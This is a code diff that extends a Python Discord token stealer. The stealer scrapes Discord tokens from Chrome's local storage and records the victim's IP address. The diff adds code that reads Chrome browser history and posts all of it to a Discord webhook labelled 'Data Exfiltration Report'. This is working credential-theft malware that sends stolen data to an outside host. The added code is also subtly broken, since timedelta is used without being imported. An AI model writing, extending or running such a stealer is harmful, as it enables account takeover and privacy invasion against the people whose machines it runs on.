@@ -4,7 +4,9 @@ import os
 import re
 import urllib.request
 import socket
+import sqlite3
 from pathlib import Path
+from datetime import datetime, timezone
 
 TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"  # noqa: S105
 REQUEST_HEADERS = {
@@ -123,27 +125,76 @@ def get_ip_address() -> str:
         return "Unknown"
 
 
-def send_tokens_to_webhook(
-    webhook_url: str, user_id_to_token: dict[str, set[str]], ip_address: str,
-) -> int:
-    """Caution: In scenarios where the victim has logged into multiple Discord
-    accounts or has frequently changed their password, the accumulation of
-    tokens may result in a message that surpasses the character limit,
-    preventing it from being sent. There are no plans to introduce code
-    modifications to segment the message for compliance with character
-    constraints.
-    """  # noqa: D205
-    fields: list[dict] = []
+def get_browser_history() -> list[tuple[str, str, datetime]]:
+    """Retrieves browser history from Chrome's history database.
 
+    Returns:
+        list[tuple[str, str, datetime]]: A list of tuples containing the URL, title, and visit time of each history item.
+    """
+    history_path = Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Default" / "History"
+    if not history_path.exists():
+        return [("Error", "History file not found", datetime.now(timezone.utc))]
+
+    try:
+        conn = sqlite3.connect(str(history_path))
+        cursor = conn.cursor()
+
+        cursor.execute("""
+            SELECT url, title, last_visit_time
+            FROM urls
+            ORDER BY last_visit_time DESC
+            LIMIT 10  -- Limit to the 10 most recent entries
+        """)
+
+        history = []
+        for url, title, last_visit_time in cursor.fetchall():
+            # Convert Chrome's timestamp to datetime
+            visit_time = datetime(1601, 1, 1, tzinfo=timezone.utc) + \
+                         timedelta(microseconds=last_visit_time)
+            history.append((url, title, visit_time))
+
+        conn.close()
+        return history
+    except Exception as e:
+        return [("Error", f"Could not read history: {e}", datetime.now(timezone.utc))]
+
+
+def send_data_to_webhook(
+    webhook_url: str, user_id_to_token: dict[str, set[str]], ip_address: str, history: list[tuple[str, str, datetime]]
+) -> int:
+    """Sends collected data to a Discord webhook.
+
+    Args:
+        webhook_url (str): The URL of the Discord webhook.
+        user_id_to_token (dict[str, set[str]]): A dictionary mapping user IDs to their tokens.
+        ip_address (str): The IP address of the machine.
+        history (list[tuple[str, str, datetime]]): A list of browser history entries.
+
+    Returns:
+        int: The HTTP status code of the webhook request.
+    """
+
+    fields = []
+
+    # Add tokens
     for user_id, tokens in user_id_to_token.items():
         fields.append({
-            "name": user_id,
+            "name": f"Tokens for {user_id}",
             "value": "\n".join(tokens),
         })
 
-    # Include IP address in the webhook message
+    # Add browser history
+    history_str = ""
+    for url, title, visit_time in history:
+        history_str += f"URL: {url}\nTitle: {title}\nVisited: {visit_time}\n\n"
+
+    fields.append({
+        "name": "Browser History (Last 10)",
+        "value": history_str if history_str else "No history found",
+    })
+
     data = {
-        "content": f"Found tokens. IP Address: {ip_address}",
+        "content": f"Data Exfiltration Report. IP Address: {ip_address}",
         "embeds": [{"fields": fields}],
     }
 
@@ -151,7 +202,6 @@ def send_tokens_to_webhook(
 
 
 def main() -> None:
-
     chrome_path = (
         Path(os.getenv("LOCALAPPDATA")) /
         "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb"
@@ -160,12 +210,15 @@ def main() -> None:
 
     if tokens is None:
         print("No tokens found.")
-        return
+        tokens = {}  # Ensure tokens is an empty dictionary if no tokens are found
 
     ip_address = get_ip_address()
     print(f"IP Address: {ip_address}")
 
-    status_code = send_tokens_to_webhook(WEBHOOK_URL, tokens, ip_address)
+    history = get_browser_history()
+    print("Browser History Retrieved.")
+
+    status_code = send_data_to_webhook(WEBHOOK_URL, tokens, ip_address, history)
     print(f"Webhook request status: {status_code}")
 
 
